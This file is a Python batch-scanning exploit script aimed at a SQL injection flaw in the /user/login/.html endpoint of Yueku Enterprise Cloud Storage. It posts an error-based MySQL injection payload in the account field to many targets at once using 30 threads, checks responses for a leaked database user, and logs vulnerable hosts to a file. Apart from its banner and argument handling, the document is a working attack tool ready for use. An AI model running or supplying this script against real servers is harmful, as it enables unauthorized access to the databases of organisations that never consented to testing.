"""悦库企业网盘 user/login/.html SQL注入漏洞批量poc(报错注入)"""
import argparse,json,requests,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test="""
██╗   ██╗██╗   ██╗███████╗██╗  ██╗██╗   ██╗    ███████╗███╗   ██╗████████╗███████╗██████╗ ██████╗ ██████╗ ██╗███████╗███████╗     ██████╗██╗      ██████╗ ██╗   ██╗██████╗ 
╚██╗ ██╔╝██║   ██║██╔════╝██║ ██╔╝██║   ██║    ██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║██╔════╝██╔════╝    ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗
 ╚████╔╝ ██║   ██║█████╗  █████╔╝ ██║   ██║    █████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝██████╔╝██████╔╝██║███████╗█████╗      ██║     ██║     ██║   ██║██║   ██║██║  ██║
  ╚██╔╝  ██║   ██║██╔══╝  ██╔═██╗ ██║   ██║    ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██║╚════██║██╔══╝      ██║     ██║     ██║   ██║██║   ██║██║  ██║
   ██║   ╚██████╔╝███████╗██║  ██╗╚██████╔╝    ███████╗██║ ╚████║   ██║   ███████╗██║  ██║██║     ██║  ██║██║███████║███████╗    ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝
   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
"""
    print(test)
def main():
    banner()
    parer=argparse.ArgumentParser(description='This is a batch POC for SQL injection vulnerabilities in Yueku Enterprise Cloud Storage')
    parer.add_argument('-u','--url',dest='url',type=str,help='Please enter your link')
    parer.add_argument('-f','--file',dest='file',type=str,help='Please enter your file path')
    ages=parer.parse_args()
    if ages.url and not ages.file:
        poc(ages.url)
    elif ages.file and not ages.url:
        url_list=[]
        with open (ages.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(30)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = '/user/login/.html'
    headers = {
        'upgrade-insecure-requests': '1',
        'user-agent': 'mozilla/5.0 (windoWS nt 10.0; win64; x64) apPleWebkit/537.36 (KHtml, liKe geckO) chrome/124.0.0.0 safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'ZH-cn,zh;q=0.9',
        'connection': 'close',
        'content-type': 'application/x-www-form-urlencoded',
        'content-length': '90',
    }
    data = "account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1=1,user()))),0x7e),1)-- aaaa"
    try:
        res1=requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        match = re.search(r'@localhost', res1.text)
        if match and match.group(0) == '@localhost':
            print(f"[+] {target} 存在漏洞 “{target+payload}”")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-] {target} 没有漏洞 “{target+payload}”")
    except:
        pass
if __name__=='__main__':
    main()